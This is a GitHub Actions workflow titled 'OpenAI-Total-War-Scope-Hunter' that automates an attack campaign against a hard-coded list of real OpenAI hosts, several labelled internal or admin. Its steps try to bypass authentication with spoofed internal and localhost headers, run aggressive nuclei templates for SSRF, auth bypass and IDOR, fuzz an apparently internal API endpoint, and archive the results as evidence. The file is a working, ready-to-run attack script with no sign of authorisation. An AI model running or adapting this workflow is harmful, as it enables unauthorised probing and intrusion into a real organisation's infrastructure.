name: OpenAI-Total-War-Scope-Hunter
on:
  workflow_dispatch:

jobs:
  exploit-hunt:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Advanced Arsenal
        run: |
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install -v github.com/ffuf/ffuf/v2@latest
          pip install arjun
          sudo mv ~/go/bin/* /usr/local/bin/

      - name: Phase 1:Mass Target Ingestion (The Full History)
        run: |
          # Combining the sci.openai.org internal ingress with the unified gateways
          cat <<EOF > all_scopes.txt
          https://memos.auth.ingress.sodium.sci.openai.org
          https://large-langdemo-external-access.auth.ingress.sodium.sci.openai.org
          https://infra-monitoring.auth.ingress.sulfur.sci.openai.org
          https://admin.unified-8.api.openai.com
          https://higherlevelapi.unified-8.api.openai.com
          https://chat.gateway.unified-79.api.openai.com
          https://api.openai.com/v1/completionsinternal
          https://academy.openai.com
          EOF

      - name: Phase 2:"Internal-Only" Smuggling Bypass
        run: |
          # Testing all targets for Gateway Bypasses using 10 different internal headers
          # We are looking for ANY change in response length (CL) or Status Code (SC)
          httpx -l all_scopes.txt \
            -H "X-OpenAI-Internal: true" \
            -H "X-Forwarded-For: 127.0.0.1" \
            -H "X-Real-IP: 10.0.0.1" \
            -H "X-ProxyUser-Ip: 127.0.0.1" \
            -H "X-Original-URL: /admin" \
            -sc -cl -title -o global_bypass_results.txt

      - name: Phase 3:Cross-Tenant BOLA & SSRF PoC
        run: |
          # Running the most aggressive Nuclei templates for SSRF and BOLA
          # Targeting the sci.openai.org internal tools specifically
          nuclei -l all_scopes.txt -tags ssrf,auth-bypass,bola,idor,cve -severity critical,high -rl 5 -o global_nuclei_results.txt

      - name: Phase 4:API Verb & Body Fuzzing (The "404" Breaker)
        run: |
          # For the 404 targets (completionsinternal), we force POST requests 
          # with common internal parameters to find the 'Identity' of the service.
          ffuf -u "https://api.openai.com/v1/completionsinternal" -X POST \
            -H "Content-Type: application/json" \
            -H "X-OpenAI-Internal: true" \
            -d '{"model": "FUZZ", "org_id": "FUZZ"}' \
            -w /usr/share/dict/words -mc 200,401,500 -o internal_api_fuzz.json || true

      - name: Archive Global Evidence
        uses: actions/upload-artifact@v4
        with:
          name: openai-total-war-results
          path: |
            global_bypass_results.txt
            global_nuclei_results.txt
            internal_api_fuzz.json
            
